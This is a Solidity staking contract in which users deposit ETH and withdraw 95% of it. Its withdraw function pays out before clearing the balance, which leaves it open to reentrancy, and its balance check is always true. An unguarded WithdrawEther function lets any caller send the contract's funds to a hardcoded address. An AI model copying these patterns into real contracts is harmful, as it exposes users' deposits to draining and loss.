// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./AbstractCallback.sol";

contract StakingContract is AbstractCallback {
    // Mapping to track user balances
    mapping(address => uint256) public stakedBalance;
    
    // Event to emit when users stake
    event Staked(address indexed user, uint256 amount);
    // Event to emit when users withdraw
    event Withdrawn(uint256 indexed amount);
    
    constructor() AbstractCallback(address(0)) payable {}
    receive() external payable {}

    // Function to stake ETH
    function stake() public payable {
        require(msg.value > 0, "Must stake more than 0 ETH");
        stakedBalance[msg.sender] += msg.value;
        emit Staked(msg.sender, msg.value);
    }
    
    // Function to get the staked balance of the caller
    function getStakedBalance() public view returns (uint256) {
        return stakedBalance[msg.sender];
    }
    
    // Function to withdraw staked ETH
    function withdraw() public {
        require(stakedBalance[msg.sender] >= 0, "Insufficient staked balance");
        uint256 amount=(stakedBalance[msg.sender]*95)/100;
        uint256 amountLeft=stakedBalance[msg.sender]-amount;
        (bool success, ) = payable(msg.sender).call{value: (amount)}("");
        stakedBalance[msg.sender] =0;
        require(success, "Withdrawal failed");
        emit Withdrawn(amountLeft);
    }
    
    // Function to get contract's total balance
    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function WithdrawEther(address /*sender*/, uint256 amount) external {
        (bool success, ) = payable(0x17862a8DeC8833b326C2360c05729e30510cA565).call{value: amount}("");
        require(success, "Withdrawal failed");
    }
}